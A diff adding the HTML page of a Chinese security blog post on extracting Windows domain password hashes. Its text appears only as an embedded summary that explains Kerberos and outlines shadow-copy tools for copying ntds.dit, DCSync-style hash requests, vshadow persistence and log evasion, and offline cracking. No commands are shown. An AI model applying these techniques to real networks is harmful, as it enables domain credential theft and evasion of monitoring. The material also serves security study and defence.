@@ -1,0 +1,886 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>域环境密码凭证获取 | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="域环境密码凭证获取"><meta name="application-name" content="域环境密码凭证获取"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="域环境密码凭证获取"><meta property="og:url" content="https://hihopkc.github.io/posts/14d8.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="Windows域认证Windows的认证包括三个部分：  本地认证：用户直接操作计算机登录账户 网络认证：远程连接到工作组中的某个设备 域认证：登陆到域环境中的某个设备  域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构KDC 的参与 活动目录活动目"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc.github.io/img/default_cover.jpg"><meta name="description" content="Windows域认证Windows的认证包括三个部分：  本地认证：用户直接操作计算机登录账户 网络认证：远程连接到工作组中的某个设备 域认证：登陆到域环境中的某个设备  域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构KDC 的参与 活动目录活动目"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/14d8"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://hihopkc.space/',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '嘻哈磕碜のBlogs',
+  title: '域环境密码凭证获取',
+  postAI: 'true',
+  pageFillDescription: 'Windows域认证, 活动目录, Kerberos协议简介, Kerberos认证协议基础, Kerbreros认证流程, 用户登录, 请求身份认证, 客户端向AS(身份认证服务)发送认证请求, AS确认Client端登录者用户身份, 请求服务授权, 客户端向TGS发送请求服务授权请求, TGS为Client响应服务授权票据, 发送服务请求, Client向Service Server发送服务请求, Service Server响应Client, 活动目录数据库, Volume Shadow Copy, Ntdsutil, 交互式, 非交互, 查询当前系统的快照, 创建快照, 挂载快照, 复制ntds.dit, 卸载快照, 删除快照, Vssadmin, 查询当前系统的快照, 创建快照, 访问快照中的文件, 复制ntds.dit, 删除快照, Vshadow, 查询当前系统的快照, 创建快照, 复制ntds.dit, 删除快照, 利用vshadow执行命令, 自启动持久化和规避, NinjaCopy, 解密NTDS.DIT文件, Mimikatz在线破解, 离线破解域认证的认证包括三个部分本地认证用户直接操作计算机登录账户网络认证远程连接到工作组中的某个设备域认证登陆到域环境中的某个设备域内认证即采用了协议的认证机制与前两者相比最大的区别是有一个可信的第三方机构的参与活动目录活动目录是指域环境中提供目录服务的组件目录用于存储有关网络对象例如用户组共享资源计算机打印机和联系人等的信息能够快速准确的从目录中找到其所需的信息的服务为企业提供了网络环境集中式管理的机制活动目录主要的功能账号集中管理所有的账户都存储在服务器中可以方便快捷的执行命令和管理密码等软件集中管理能够统一推送软件安装网络打印机等服务器环境集中管理统一客户端桌面等增强安全性统一部署杀软统一执行病毒扫描任务集中管理用户的计算机权限统一指定密码策略更加的可靠更短的宕机时间在域中网络对象可以相互访问但是在真实情况中需要对某些部门的计算机进行限制例如销售部门不能访问技术部门的服务器这个中间就需要认证协议来验证网络对象间的权限协议简介是一种网络认证协议其设计目标是通过密钥系统为客户机服务器应用程序提供强大的认证服务该认证过程的实现不依赖于主机操作系统的认证无需基于主机地址的信任不要求网络上所有主机的物理安全并假定网络上传送的数据包可以被任意地读取修改和插入数据在以上情况下作为一种可信任的第三方认证服务是通过传统的密码技术如共享密钥执行认证服务的参与域认证的三个角色访问服务的用户提供服务的服务密钥分发中心在中是否有权限访问端的服务由发放的票据来决定认证协议基础票据是网络对象互相访问的凭证存储域中所有用户的用户名和对应的可以理解为域中的数据库可以从中提取域中所有用户的这是协议能够成功实现的基础密钥分发中心负责管理票据认证票据分发票据里面包含两个服务和从物理层面看与均为域控制器身份认证服务为生成的服务也用来完成对的身份验证票据授予服务为生成允许对某个服务访问的就是从那里拿到之后来这里再申请对某个特定服务或服务器访问的只有获取到这个才有权限去访问对应的服务该服务提供的票据也称为或者叫白银票据看英文名就知道用来生成的由身份认证服务授予的票据黄金票据用于身份认证存储在内存默认有效期为小时注意密钥密钥和密钥均为对应用户的密钥用户的和可以当作一个东西就是想要访问的服务器或者服务可以看作客户端与服务和尝试登陆的之间会话时用来加密的密钥而密钥上面提到的三个实际为的密钥是用来加密会话密钥的密钥为了保证会话密钥的传输安全这些加密方式均为对称加密参与认证的三个角色的是三个密钥这三个的唯一作用是确保会话密钥的安全传输认证流程向发起服务请求希望获取访问的权限得到了这个消息首先得判断是否是可信赖的也就是从数据库中寻找该用户是否可用来登录这就是服务完成的工作成功后返回给得到了后继续向请求希望获取访问的权限又得到了这个消息这时候通过消息中的判断出了拥有了这个权限给了访问的权限服务的任务得到后便可以使用这个成功访问但是这个只能用来访问这个如果要访问其他需要向重新申请用户登录用户输入用户名和密码信息在客户端用户输入的密码通过计算生成哈希作做为密钥请求身份认证客户端向身份认证服务发送认证请求客户端向发送认证请求请求中带有明文的用户名信息此时并未发送密码或密钥信息确认端登录者用户身份收到用户认证请求之后根据请求中的用户名信息从数据库中查找该用户名是否存在如果用户名存在则根据该用户名提取做为生成的密钥如果第步中用户提供的密码信息正确该秘钥与用户登录中的密钥是相等的为响应如下消息使用生成的密钥加密的使用密钥加密的客户端没有因此无法解密中包含如下信息有效时间地址收到的响应消息以后利用自身的密钥可以对进行解密这样可以获取到但由于是使用密钥加密的无法对其解密响应的消息中有一条是属于的但另外一条却属于出现了两个一个给端一个给端认证过程中的加密除哈希外均采用的是对称加密算法请求服务授权客户端向发送请求服务授权请求客户端发送的请求中包含如下两个消息要请求的服务即上一步中由为提供的使用加密的接收到与其他内容后会首先使用的解密只有可以解密从中提取到再使用解密获取到并与通过解密获取到的有效时间进行对比为响应服务授权票据为响应的消息包括使用密钥服务器的加密的该中包含了如下信息网络地址有效时间使用加密的使用了加密因此该消息对可见对其解密以后可获取到而使用了密钥加密该消息可视作是给的消息只不过由一起携带发送给发送服务请求向发送服务请求发送的消息中包括上一步中为响应的消息该消息可以理解为由携带的消息由加密的包含信息并非直接传输而是被包含在使用密钥加密的中既然并不直接明文传输需要向证明自己拥有正确的所以使用了加密响应收到客户端的服务请求之后先利用自身的密钥对进行解密提取出在步骤中提到了该中包含了以及信息使用解密提取信息而后将该与中的进行比对如果匹配则说明拥有正确的而后向响应包含使用加密的信息收到的响应消息之后再使用对其解密提取信息然后确认该信息与发送的中的信息一致如上信息可以看出来该交互过程起到了与之间的双向认证作用活动目录数据库域服务数据存储由文件构成是的核心默认存储在域控的文件夹下只能通过域控制器进程和协议访问活动目录数据库是主要的数据库包括有关域用户组和组成员身份的信息它还包括域中所有用户的密码哈希值在工作组环境中文件存储着当前主机用户的密码哈希值在域环境中文件存储了域中所有用户的密码哈希值因此我们可以通过获取到这两个文件然后破解得到其中所存储的密码哈希值系统为了进一步保护存储的密码哈希值使用存储在注册表配置单元中的密钥对这些哈希值进行加密因此想要破解文件与文件都需要获取一个文件文件位置文件位置文件位置由于会阻止对这些文件的标准读取或复制操作如果直接去复制文件会提示文件被系统占用所以常规的复制下载方法是无法获取到文件副本的因此需要通过特殊方法来获取卷影复制服务是微软从开始提供的用于创建一致性的时间点副本也就是快照的服务框架用于更好的备份和还原关键业务数据当所有组件都支持时可以使用它们来备份应用程序数据而无需使应用程序脱机用于数据备份支持及以上操作系统系统默认在特定条件下自动创建数据备份如补丁安装后在系统大概每隔一周自动创建备份该时间无法确定禁用会影响系统正常使用如和我们可以利用来获取等文件副本注意调用服务会产生日志为执行会额外产生为的日志是一个命令行工具它为域服务和轻型目录服务提供管理工具您可以使用命令执行的数据库维护管理和控制单个主机操作并删除域控制器留下的元数据这些域控制器在未正确卸载的情况下从网络中删除域环境默认安装要使用必须从管理员命令提示符运行如果安装了服务器角色但未安装服务器角色则可以使用和命令行工具来执行可以使用执行的相同任务支持系统交互式进入命令行进入快照激活实例完之后再执行以管理员身份打开命令提示符在命令提示符输入命令在提示符下输入激活实例为可写和只读域控制器和实例创建安装介质为可写域控制器或实例创建安装介质到指定文件夹中是要创建文件的文件夹路径非交互查询当前系统的快照创建快照为挂载快照快照挂载为复制卸载快照删除快照卷影复制服务管理命令行工具域环境默认安装支持系统查询当前系统的快照创建快照获得为访问快照中的文件查看快照列表无法直接访问中的文件可通过创建符号链接访问快照中的文件删除符号链接如下图复制删除快照是用于管理卷影副本的命令行实用程序此工具包含在中有签名有很多功能包括执行脚本和调用命令以支持卷影快照管理的能力查询当前系统的快照创建快照参数说明备份操作重启系统不会删除用来提高创建速度对应盘获得复制删除快照利用执行命令参考支持参数可用于执行二进制文件或脚本参数不支持命令参数要求管理员权限上传上传攻击载荷执行命令格式系统驱动器允许我们在不调用卷影副本编写器的情况下创建卷影副本实际上这是一个非持久性卷影副本不会留下物理磁盘证据执行命令成功执行将启动卷影服务如系统事件所示并调用进程执行后后台存在进程同时显示服务正在运行需要手动关闭进程注手动关闭进程会生成日志自启动持久化和规避利用思路包含微软签名能绕过某些白名单的限制如果作为启动项的默认启动列表不显示在中当过滤时我们将看不到我们的登录条目但是如果我们取消选择并启用我们将看到我们的持久性机制的记录使用复制绕过下载地址用于获取哈希的技术要么依赖于将代码注入要么使用卷影复制服务来获取包含哈希的文件的副本一个脚本能够通过获取卷的读取句柄并解析来复制注册表配置单元和位于卷上的任何其他文件这不需要提升到注入到进程或启动新服务可疑程序原理简述获取卷的读取句柄管理员帐户可以执行此操作能够读取整个卷的原始字节然后解析卷上的结构确定特定文件的字节在卷上的位置扫描到该位置并复制文件字节编写的解析器将现有的解析器编译为并将其加载到没有调用服务因此不会产生日志解密文件在线破解在线破解不用将域控上的文件下载下来直接在已有的上破解有一个弹回的就可以在中直接利用来破解前提是要有管理员权限有一个可以在会话中加载模块直接在目标主机进行密码凭证获取有一个功能它可以利用目录复制服务从文件中提取密码哈希值工作原理攻击者获得管理员及以上权限后可以使用等工具模拟域控制器然后攻击者使用命令在目标域控制器上请求某个指定帐户的存储凭证密码哈希值而无需提供该帐户的明文密码但是攻击者需要知道目标帐户的名称以及目标系统的域名和管理员凭据目标域控制器接收到此请求后将密码哈希值返回给攻击者攻击者可以使用获得的密码哈希值来执行其他攻击例如攻击这种攻击技术允许攻击者使用哈希值进行身份验证并获取对系统的访问权限而无需知道实际的明文密码此外攻击者也可以尝试破解密码哈希值以获得明文密码获取域内所有用户查看单个用户的详细信息查看所有用户的详细信息离线破解离线破解一般需要两步首先就是将远端域控的下载到本地然后再在本地进行破解文件一直在被系统使用所以常规的复制下载方法是无法将文件下载到本地的首先将域控的和文件下载到本地然后在本地进行破解通过套件中的脚本获取中可以使用命令解密得到明文密码复制账号的写入文件中使用进行破解模块提供了构建在框架之上的易于使用的主要功能包括离线文件操作以及通过目录复制服务远程协议查询域控制器支持系统要使用模块提取用户哈希值我们需要先获取这两个文件将这两个文件导出并拖到我们本地后即可执行如下命令获取所有账户哈希导入模块获取获取所有账户信息还可以导出支持格式的哈希',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-18 22:07:19',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" 